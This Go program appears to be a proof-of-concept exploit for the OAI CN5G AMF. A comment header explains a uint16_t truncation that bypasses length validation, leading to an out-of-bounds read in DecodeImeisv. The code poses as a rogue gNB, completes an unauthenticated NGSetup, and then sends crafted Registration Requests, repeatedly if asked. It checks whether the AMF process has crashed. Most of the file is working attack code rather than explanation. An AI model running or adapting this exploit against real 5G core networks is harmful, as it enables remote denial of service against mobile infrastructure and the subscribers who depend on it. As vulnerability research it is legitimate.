// F21 -- OAI CN5G AMF: Type6NasIe::Validate() uint16_t truncation defeats the
// only upper-bound length check on every Type 6 NAS IE, weaponised through
// _5gsMobileIdentity::DecodeImeisv(), the one identity branch that is never
// told the real buffer size.
//
// Root cause chain (paths relative to sources/oai-cn5g-amf/src/common-src):
//
//	1. nas/ies/Type6NasIe.hpp:40      uint16_t li_;   // length indicator, straight off the wire
//	2. nas/ies/Type6NasIe.cpp:125     DECODE_U16(buf + decoded_size, li_, decoded_size);
//	3. nas/ies/Type6NasIe.cpp:48-49   uint32_t GetIeLength() const {
//	                                     return (GetHeaderLength() + li_);   // 2 + 65535 = 65537
//	                                  }
//	4. nas/ies/Type6NasIe.cpp:58-60   bool Type6NasIe::Validate(int len) const {
//	                                     uint16_t ie_len = GetIeLength();    // *** CWE-197: 65537 -> 1 ***
//	                                     if (len < ie_len) { ...; return false; }
//	5. nas/ies/Type6NasIe.cpp:128     if (!Validate(len)) return KEncodeDecodeError;  // the ONLY gate
//	6. nas/ies/_5gsMobileIdentity.cpp:77       ie_len = GetLengthIndicator();  // the TRUE li_ = 65535
//	7. nas/ies/_5gsMobileIdentity.cpp:106-108  case kImeisv:
//	                                       decoded_size += DecodeImeisv(buf + decoded_size, ie_len);
//	   The other three branches all receive the real remaining length:
//	     :94  case kSuci:     DecodeSuci(buf + decoded_size, len - decoded_size, ie_len);
//	     :100 case k5gGuti:   Decode5gGuti(buf + decoded_size, len - decoded_size);
//	     :103 case k5gSTmsi:  Decode5gSTmsi(buf + decoded_size, len - decoded_size);
//	   IMEISV alone is handed only the attacker-declared length.
//	8. nas/ies/_5gsMobileIdentity.cpp:725,736
//	                                     int DecodeImeisv(const uint8_t* const buf, int len) {
//	                                       for (int i = 0; i < len; i++) {
//	                                         DECODE_U8(buf + decoded_size, octet, decoded_size);
//	   No bound and no decode_bstring-style guard: 65535 octets are walked out
//	   of a ~27-octet NAS buffer (CWE-125), appending two std::to_string digits
//	   per octet into a std::string that grows to ~131070 characters.
//
// Truncation arithmetic. RegistrationRequest.cpp:835 decodes the 5GS mobile
// identity with is_iei == false, so GetHeaderLength() == 2:
//
//	li_      GetIeLength() (uint32)   uint16_t ie_len   Validate verdict
//	65533    65535                    65535             REJECTED   <-- safe control
//	65534    65536                    0                 ACCEPTED   <-- bypass
//	65535    65537                    1                 ACCEPTED   <-- bypass (default attack)
//
// The bypass window is exactly two values for a 2-octet header and three for a
// 3-octet header (is_iei == true). li_ == 65533 does NOT wrap, the guard fires
// correctly and the message is rejected -- that is the differential control.
//
// Attacker model: identical to F8. A rogue gNB opens an SCTP association to
// N2 port 38412, sends NGSetupRequest (the AMF does not authenticate gNBs) and
// then InitialUEMessage carrying this Registration Request. No SIM, no
// subscriber, no security context, no prior signalling.
package main

import (
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"syscall"
	"time"

	"github.com/free5gc/aper"
	"github.com/free5gc/ngap"
	"github.com/free5gc/ngap/ngapType"
	"github.com/free5gc/sctp"
)

func syscallTimeval(msec int64) syscall.Timeval {
	return syscall.Timeval{Sec: msec / 1000, Usec: (msec % 1000) * 1000}
}

func isEAGAIN(err error) bool {
	return errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EINTR)
}

// encodePLMN builds the NGAP PLMNIdentity (TS 38.413) BCD octets.
func encodePLMN(mcc, mnc string) ngapType.PLMNIdentity {
	b := make([]byte, 3)
	b[0] = (mcc[1]-'0')<<4 | (mcc[0] - '0')
	if len(mnc) == 2 {
		b[1] = 0xf0 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	} else {
		b[1] = (mnc[2]-'0')<<4 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	}
	return ngapType.PLMNIdentity{Value: aper.OctetString(b)}
}

func encodeTAC(tac uint64) ngapType.TAC {
	tacBytes, _ := hex.DecodeString(fmt.Sprintf("%06x", tac))
	return ngapType.TAC{Value: aper.OctetString(tacBytes)}
}

// imeisvContent builds the 5GS mobile identity IE *content* for an identity of
// type IMEISV. Only contentCap octets are emitted, while the 2-octet length
// indicator in front of them declares li octets: that gap is precisely what
// DecodeImeisv walks out of bounds.
//
//	[0]   SUPI format (bits 7-5) | odd/even (bit 3) | type of identity (bits 2-0)
//	[1..] IMEI/IMEISV digits, BCD, low nibble first
//
// The AMF dispatches on `octet & 0x07` (_5gsMobileIdentity.cpp:89), so the type
// of identity occupies the LOW three bits and must NOT be shifted: 0x05 selects
// kImeisv, whereas 0x0a would select k5gGuti (0b010).
func imeisvContent(contentCap int, typeOfIdentity uint8, imei string) []byte {
	c := make([]byte, 0, 16)
	// SUPI format 0b000 == IMSI in bits 7-5; type of identity in bits 2-0.
	c = append(c, (0x00<<5)|(typeOfIdentity&0x07))
	digits := imei
	for i := 0; i+1 < len(digits) && len(c) < contentCap; i += 2 {
		lo := digits[i] - '0'
		hi := digits[i+1] - '0'
		c = append(c, hi<<4|lo)
	}
	for len(c) < contentCap {
		c = append(c, 0xf0) // end-mark filler
	}
	return c[:contentCap]
}

// buildRegistrationRequest builds a plain-NAS 5GMM Registration Request whose
// 5GS mobile identity IE declares li octets but carries only contentCap:
//
//	7e 00 41 79 | <li:2> <IMEISV content contentCap B> | 2e 04 f0f0f0f0 | 2f 05 04 <sst> <sd>
//
// OAI decodes the 5GS mobile identity as a Type 6 IE with a 2-octet length and
// WITHOUT the spec's 0x77 IEI octet (is_iei == false at RegistrationRequest.cpp:835),
// which is what makes GetHeaderLength() == 2 and puts the truncation window at
// li in {65534, 65535}.
func buildRegistrationRequest(li int, contentCap int, typeOfIdentity uint8, imei string, sst byte, sd string, trailer bool) []byte {
	nas := []byte{0x7e, 0x00, 0x41} // EPD 5GMM, plain NAS security header, Registration Request
	nas = append(nas, 0x79)         // ngKSI (high nibble) + registration type (low nibble)

	nas = append(nas, byte(li>>8), byte(li))
	nas = append(nas, imeisvContent(contentCap, typeOfIdentity, imei)...)

	if trailer {
		// UE security capability (IEI 0x2e): EA0-7, IA0-7
		nas = append(nas, 0x2e, 0x04, 0xf0, 0xf0, 0xf0, 0xf0)
		// Requested NSSAI (IEI 0x2f)
		sdB, _ := hex.DecodeString(sd)
		nas = append(nas, 0x2f, 0x05, 0x04, sst, sdB[0], sdB[1], sdB[2])
	}
	return nas
}

func buildNGSetupRequest(mcc, mnc string, tac uint64, gnbId uint32, sst byte, sd string) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeNGSetup
	im.Criticality.Value = ngapType.CriticalityPresentReject
	im.Value.Present = ngapType.InitiatingMessagePresentNGSetupRequest
	im.Value.NGSetupRequest = new(ngapType.NGSetupRequest)
	req := im.Value.NGSetupRequest
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDGlobalRANNodeID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentGlobalRANNodeID
		ie.Value.GlobalRANNodeID = new(ngapType.GlobalRANNodeID)
		grni := ie.Value.GlobalRANNodeID
		grni.Present = ngapType.GlobalRANNodeIDPresentGlobalGNBID
		grni.GlobalGNBID = new(ngapType.GlobalGNBID)
		grni.GlobalGNBID.PLMNIdentity = encodePLMN(mcc, mnc)
		grni.GlobalGNBID.GNBID.Present = ngapType.GNBIDPresentGNBID
		grni.GlobalGNBID.GNBID.GNBID = new(aper.BitString)
		grni.GlobalGNBID.GNBID.GNBID.Bytes = []byte{byte(gnbId >> 24), byte(gnbId >> 16), byte(gnbId >> 8), byte(gnbId)}
		grni.GlobalGNBID.GNBID.GNBID.BitLength = 32
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDSupportedTAList
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentSupportedTAList
		ie.Value.SupportedTAList = new(ngapType.SupportedTAList)
		bplmn := ngapType.BroadcastPLMNItem{}
		bplmn.PLMNIdentity = encodePLMN(mcc, mnc)
		ssItem := ngapType.SliceSupportItem{}
		ssItem.SNSSAI.SST.Value = aper.OctetString{sst}
		if sd != "" {
			sdB, _ := hex.DecodeString(sd)
			ssItem.SNSSAI.SD = new(ngapType.SD)
			ssItem.SNSSAI.SD.Value = aper.OctetString(sdB)
		}
		bplmn.TAISliceSupportList.List = append(bplmn.TAISliceSupportList.List, ssItem)
		taItem := ngapType.SupportedTAItem{}
		taItem.TAC = encodeTAC(tac)
		taItem.BroadcastPLMNList.List = append(taItem.BroadcastPLMNList.List, bplmn)
		ie.Value.SupportedTAList.List = append(ie.Value.SupportedTAList.List, taItem)
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDDefaultPagingDRX
		ie.Criticality.Value = ngapType.CriticalityPresentIgnore
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentDefaultPagingDRX
		ie.Value.DefaultPagingDRX = new(ngapType.PagingDRX)
		ie.Value.DefaultPagingDRX.Value = ngapType.PagingDRXPresentV32
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func buildInitialUEMessage(mcc, mnc string, tac uint64, ranUeNgapID int64, nasPdu []byte) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeInitialUEMessage
	im.Criticality.Value = ngapType.CriticalityPresentIgnore
	im.Value.Present = ngapType.InitiatingMessagePresentInitialUEMessage
	im.Value.InitialUEMessage = new(ngapType.InitialUEMessage)
	req := im.Value.InitialUEMessage
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRANUENGAPID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentRANUENGAPID
		ie.Value.RANUENGAPID = new(ngapType.RANUENGAPID)
		ie.Value.RANUENGAPID.Value = ranUeNgapID
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDNASPDU
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentNASPDU
		ie.Value.NASPDU = new(ngapType.NASPDU)
		ie.Value.NASPDU.Value = nasPdu
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDUserLocationInformation
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentUserLocationInformation
		ie.Value.UserLocationInformation = new(ngapType.UserLocationInformation)
		uli := ie.Value.UserLocationInformation
		uli.Present = ngapType.UserLocationInformationPresentUserLocationInformationNR
		uli.UserLocationInformationNR = new(ngapType.UserLocationInformationNR)
		uli.UserLocationInformationNR.NRCGI.PLMNIdentity = encodePLMN(mcc, mnc)
		uli.UserLocationInformationNR.NRCGI.NRCellIdentity.Value = aper.BitString{
			Bytes: []byte{0x00, 0x00, 0x00, 0x01, 0x00}, BitLength: 36}
		uli.UserLocationInformationNR.TAI.PLMNIdentity = encodePLMN(mcc, mnc)
		uli.UserLocationInformationNR.TAI.TAC = encodeTAC(tac)
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRRCEstablishmentCause
		ie.Criticality.Value = ngapType.CriticalityPresentIgnore
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentRRCEstablishmentCause
		ie.Value.RRCEstablishmentCause = new(ngapType.RRCEstablishmentCause)
		ie.Value.RRCEstablishmentCause.Value = ngapType.RRCEstablishmentCausePresentMoSignalling
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func dial(host string, port int) (*sctp.SCTPConn, error) {
	raddr, err := net.ResolveIPAddr("ip", host)
	if err != nil {
		return nil, err
	}
	cfg := sctp.SocketConfig{
		InitMsg: sctp.InitMsg{NumOstreams: 5, MaxInstreams: 5, MaxAttempts: 4, MaxInitTimeout: 8},
	}
	conn, err := cfg.Dial("sctp", nil, &sctp.SCTPAddr{IPAddrs: []net.IPAddr{*raddr}, Port: port})
	if err != nil {
		return nil, err
	}
	info, err := conn.GetDefaultSentParam()
	if err != nil {
		conn.Close()
		return nil, err
	}
	info.PPID = ngap.PPID
	if err := conn.SetDefaultSentParam(info); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

func readMsg(conn *sctp.SCTPConn, timeout time.Duration) ([]byte, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		if err := conn.SetReadTimeout(syscallTimeval(1000)); err != nil {
			return nil, err
		}
		n, info, _, err := conn.SCTPRead(buf)
		if err != nil {
			if isEAGAIN(err) {
				continue
			}
			return nil, err
		}
		if n == 0 {
			continue
		}
		if info != nil && info.PPID != ngap.PPID {
			continue
		}
		out := make([]byte, n)
		copy(out, buf[:n])
		return out, nil
	}
	return nil, fmt.Errorf("timeout")
}

func main() {
	host := flag.String("host", "172.30.0.9", "AMF NGAP IP")
	port := flag.Int("port", 38412, "AMF NGAP SCTP port")
	mcc := flag.String("mcc", "208", "PLMN MCC")
	mnc := flag.String("mnc", "95", "PLMN MNC")
	tac := flag.Uint64("tac", 0xa000, "TAC matching AMF plmn_support_list")
	sst := flag.Uint("sst", 222, "S-NSSAI SST")
	sd := flag.String("sd", "00007b", "S-NSSAI SD (hex)")
	gnbId := flag.Uint("gnbid", 0x0abeef, "rogue gNB ID")
	li := flag.Int("li", 65535, "declared 5GS mobile identity length indicator (65534/65535 bypass Validate; 65533 is rejected)")
	contentCap := flag.Int("content", 8, "octets of IE content actually emitted (must stay far below -li)")
	idType := flag.Uint("idtype", 5, "type of identity in bits 3-1 (5 == kImeisv, 1 == kSuci)")
	imei := flag.String("imei", "01234567890123", "IMEI/IMEISV digits used to fill the emitted content")
	noTrailer := flag.Bool("no-trailer", false, "omit the trailing UE security capability / NSSAI IEs")
	dry := flag.Bool("dry", false, "print the crafted NAS PDU and exit (no network)")
	ranUeID := flag.Int64("ranueid", 1, "RAN UE NGAP ID of the first Registration Request")
	repeat := flag.Int("repeat", 1, "send this many crafted Registration Requests over ONE SCTP association")
	delay := flag.Duration("delay", 0, "delay between repeated Registration Requests (e.g. 20ms)")
	flag.Parse()

	nas := buildRegistrationRequest(*li, *contentCap, uint8(*idType), *imei, byte(*sst), *sd, !*noTrailer)

	// Mirror the AMF's own arithmetic so the bypass is self-documenting.
	const header = 2 // is_iei == false at RegistrationRequest.cpp:835
	ieLen32 := uint32(header + *li)
	ieLen16 := uint16(ieLen32)
	remaining := len(nas) - 4 // everything after the 0x7e 0x00 0x41 0x79 prefix

	fmt.Printf("[*] crafted NAS Registration Request (%d octets), declared 5GS mobile identity li_ = %d (0x%04x)\n",
		len(nas), *li, *li)
	fmt.Printf("[*] NAS hex: %s\n", hex.EncodeToString(nas))
	fmt.Printf("[*] Type6NasIe::Validate(len=%d): GetIeLength() = %d + %d = %d (uint32_t) -> uint16_t ie_len = %d\n",
		remaining, header, *li, ieLen32, ieLen16)
	if remaining >= int(ieLen16) {
		fmt.Printf("[*] 'len < ie_len' => %d < %d is FALSE -> Validate PASSES (truncation bypass)\n",
			remaining, ieLen16)
		if uint8(*idType)&0x07 == 5 {
			fmt.Printf("[*] dispatch: octet 0x%02x & 0x07 == %d == kImeisv -> DecodeImeisv(buf+%d, %d) with NO buffer length\n",
				uint8(*idType)&0x07, uint8(*idType)&0x07, header, *li)
			fmt.Printf("[*] loop walks %d octets from a %d-octet NAS buffer -> %d octets out of bounds\n",
				*li, len(nas), *li-(len(nas)-header))
			fmt.Printf("[*] imeisv_tmp.identity grows to ~%d chars (2 std::to_string digits per octet)\n", 2**li)
		}
	} else {
		fmt.Printf("[*] 'len < ie_len' => %d < %d is TRUE -> Validate REJECTS the IE (safe control)\n",
			remaining, ieLen16)
		fmt.Printf("[*] Type6NasIe::Decode returns KEncodeDecodeError at :128 BEFORE any dispatch,\n")
		fmt.Printf("[*] so DecodeImeisv is never entered and no out-of-bounds read occurs\n")
	}

	if *dry {
		iue, err := buildInitialUEMessage(*mcc, *mnc, *tac, *ranUeID, nas)
		if err != nil {
			log.Fatalf("[-] build InitialUEMessage: %v", err)
		}
		fmt.Printf("[*] InitialUEMessage hex (%d octets): %s\n", len(iue), hex.EncodeToString(iue))
		return
	}

	conn, err := dial(*host, *port)
	if err != nil {
		log.Fatalf("[-] SCTP dial %s:%d: %v", *host, *port, err)
	}
	defer conn.Close()
	log.Printf("[+] SCTP association to %s:%d established", *host, *port)

	// 1. NGSetup -- the AMF does not authenticate gNBs.
	ngsetup, err := buildNGSetupRequest(*mcc, *mnc, *tac, uint32(*gnbId), byte(*sst), *sd)
	if err != nil {
		log.Fatalf("[-] build NGSetup: %v", err)
	}
	if _, err := conn.SCTPWrite(ngsetup, nil); err != nil {
		log.Fatalf("[-] send NGSetup: %v", err)
	}
	resp, err := readMsg(conn, 5*time.Second)
	if err != nil {
		log.Fatalf("[-] no NGSetupResponse: %v", err)
	}
	rpdu, derr := ngap.Decoder(resp)
	if derr != nil || rpdu == nil || rpdu.Present != ngapType.NGAPPDUPresentSuccessfulOutcome {
		log.Fatalf("[-] NGSetup rejected (PLMN/TAC/NSSAI mismatch?): %s", hex.EncodeToString(resp))
	}
	log.Printf("[+] NGSetup accepted (rogue gNB %08x, unauthenticated)", *gnbId)

	// 2. InitialUEMessage(s) carrying the crafted Registration Request.
	// One association is reused for all repeats so that the AMF's per-gNB
	// context and descriptor count stay constant.
	t0 := time.Now()
	for n := 0; n < *repeat; n++ {
		id := *ranUeID + int64(n)
		iue, err := buildInitialUEMessage(*mcc, *mnc, *tac, id, nas)
		if err != nil {
			log.Fatalf("[-] build InitialUEMessage: %v", err)
		}
		if _, err := conn.SCTPWrite(iue, nil); err != nil {
			log.Printf("[!] send InitialUEMessage #%d failed after %v: %v", n+1, time.Since(t0).Round(time.Millisecond), err)
			log.Printf("[+] VERDICT: association lost after %d request(s) -> AMF process died", n)
			os.Exit(0)
		}
		if n == 0 {
			log.Printf("[+] InitialUEMessage sent at %s: Registration Request with 5GS mobile identity li_=%d, type of identity=%d",
				t0.Format(time.RFC3339Nano), *li, *idType)
		}
		if n > 0 && *delay > 0 {
			time.Sleep(*delay)
		}
		if (n+1)%500 == 0 {
			log.Printf("[*] %d/%d crafted Registration Requests sent (%v elapsed)", n+1, *repeat, time.Since(t0).Round(time.Second))
		}
	}
	log.Printf("[+] %d crafted Registration Request(s) delivered in %v",
		*repeat, time.Since(t0).Round(time.Millisecond))

	// 3. Observe the association: a dead AMF tears the SCTP association down.
	log.Printf("[*] watching for a downlink NAS response (AMF alive) or association loss (AMF dead)...")
	for i := 0; i < 8; i++ {
		raw, rerr := readMsg(conn, 2*time.Second)
		if rerr != nil {
			if strings.Contains(fmt.Sprint(rerr), "timeout") {
				continue
			}
			log.Printf("[!] SCTP read error after %v: %v", time.Since(t0).Round(time.Millisecond), rerr)
			log.Printf("[+] VERDICT: association lost -> AMF process died (SIGSEGV in DecodeImeisv OOB read)")
			os.Exit(0)
		}
		pdu, derr := ngap.Decoder(raw)
		if derr != nil || pdu == nil {
			log.Printf("[*] undecodable downlink (%d octets): %s", len(raw), hex.EncodeToString(raw))
			continue
		}
		log.Printf("[*] AMF STILL ALIVE, downlink NGAP received: %s", hex.EncodeToString(raw))
	}
	log.Printf("[-] no association loss observed within the watch window; check `docker inspect oai-amf`")
}
